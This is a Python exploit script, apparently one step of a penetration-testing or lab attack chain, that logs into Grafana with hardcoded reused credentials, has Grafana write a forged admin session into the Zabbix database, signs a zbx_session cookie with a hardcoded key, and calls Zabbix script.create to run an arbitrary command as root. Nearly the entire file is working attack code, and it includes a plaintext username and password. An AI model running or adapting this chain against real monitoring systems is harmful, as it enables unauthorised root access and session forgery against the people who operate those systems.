#!/usr/bin/env python3
"""Step 6 - Grafana (reused creds) -> forge Zabbix admin session -> RCE as root.

Flow:
  1. log in to Grafana with the reused education@ creds
  2. have Grafana's datasource write a forged admin session into the Zabbix DB
  3. mint the zbx_session HMAC cookie (session_key from Zabbix config)
  4. call Zabbix api_jsonrpc.php script.create -> command runs as root

Usage: python3 forge_zabbix_session.py [grafana_url] [zabbix_url] [command]
"""
import base64
import hashlib
import hmac
import json
import sys
import requests

GRAFANA = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000").rstrip("/")
ZABBIX = (sys.argv[2] if len(sys.argv) > 2 else "http://localhost:8084").rstrip("/")
COMMAND = sys.argv[3] if len(sys.argv) > 3 else "id; hostname"

SESSION_KEY = "713a5c3bc0688c7106abfdd90bfcd0d1"   # from Zabbix config, via Grafana
SESSIONID = "a34d0e8b9c2f1a3d5e7f9a1b2c3d4e5f"
SECRET = "a1b2c3d4e5f60718293a4b5c6d7e8f90"


def grafana_login():
    r = requests.post(f"{GRAFANA}/login",
                      json={"user": "education@atbmarket.com", "password": "Edu003868$"},
                      timeout=15)
    print(f"[1] grafana login -> {r.status_code}: {r.text.strip()[:80]}")
    return r.ok


def grafana_forge():
    r = requests.post(f"{GRAFANA}/api/zabbix/forge",
                      json={"sessionid": SESSIONID, "userid": 1, "secret": SECRET},
                      timeout=15)
    print(f"[2] grafana -> zabbix DB write -> {r.status_code}: {r.text.strip()[:80]}")


def make_cookie():
    sign = hmac.new(SESSION_KEY.encode(), SESSIONID.encode(), hashlib.sha256).hexdigest()
    inner = json.dumps({"sessionid": SESSIONID, "sign": sign})
    cookie = base64.b64encode(inner.encode()).decode()
    print(f"[3] forged zbx_session cookie minted (sign={sign[:16]}...)")
    return cookie


def zabbix_rce(cookie, command):
    body = {"jsonrpc": "2.0", "method": "script.create",
            "params": {"command": command, "execute_on": 1, "type": 0,
                       "scope": 2, "host_access": 2}, "id": 1}
    r = requests.post(f"{ZABBIX}/api_jsonrpc.php", json=body,
                      headers={"Cookie": f"zbx_session={cookie}"}, timeout=20)
    print(f"[4] zabbix script.create -> {r.status_code}")
    try:
        out = r.json().get("result", {}).get("output", r.text)
    except Exception:
        out = r.text
    print("--- command output (root on zb-app-p01) ---")
    print(out)
    return r


if __name__ == "__main__":
    grafana_login()
    grafana_forge()
    zabbix_rce(make_cookie(), COMMAND)
